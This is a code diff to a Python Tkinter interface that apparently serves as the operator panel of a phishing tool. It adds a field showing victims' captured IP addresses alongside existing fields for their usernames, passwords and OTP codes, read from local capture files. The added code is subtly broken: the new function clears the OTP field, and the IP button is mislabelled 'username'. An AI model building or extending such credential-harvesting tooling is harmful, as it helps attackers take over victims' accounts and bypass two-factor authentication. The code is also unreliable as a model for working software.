@@ -27,6 +27,10 @@ def sites():
 			i = open("process/otp.txt")
 			otparea.delete(0, END)
 			otparea.insert(INSERT, i.read())
+		def ipfinder():
+			j = open("process/ip.txt")
+			otparea.delete(0, END)
+			ipplace.insert(INSERT, j.read())
 		root3 = Tk()
 		root3.title("link")
 		
@@ -38,23 +42,28 @@ def sites():
 		
 		listener = Button(root3, text="start capturing", command=capture).grid(row=1,column=0)
 	
+		ip = Button(root3,text="username", command= ipfinder)
+		ip.grid(row=2, column=0)
+		ipplace= Entry(root3, width=60, font="Calibri 10")
+		ipplace.grid(row=2, column=2)
+		ipplace.insert(INSERT, "click ip to update")
 		
 		username = Button(root3,text="username", command= uname)
-		username.grid(row=2, column=0)
+		username.grid(row=3, column=0)
 		unameplace= Entry(root3, width=60, font="Calibri 10")
-		unameplace.grid(row=2, column=2)
+		unameplace.grid(row=3, column=2)
 		unameplace.insert(INSERT, "click username to update")
 		
 		pw = Button(root3,text="password", command= pwget)
-		pw.grid(row=3, column=0)
+		pw.grid(row=4, column=0)
 		pwarea = Entry(root3, width=60, font="Calibri 10")
-		pwarea.grid(row=3,column=2)
+		pwarea.grid(row=4,column=2)
 		pwarea.insert(INSERT, "click password to update")
 		
 		otp = Button(root3,text="OTP", command= otpget)
-		otp.grid(row=4, column=0)
+		otp.grid(row=5, column=0)
 		otparea = Entry(root3, width=60, font="Calibri 10")
-		otparea.grid(row=4,column=2)
+		otparea.grid(row=5,column=2)
 		otparea.insert(INSERT, "click OTP to update")
 		root3.mainloop()
 	root1 = Tk()
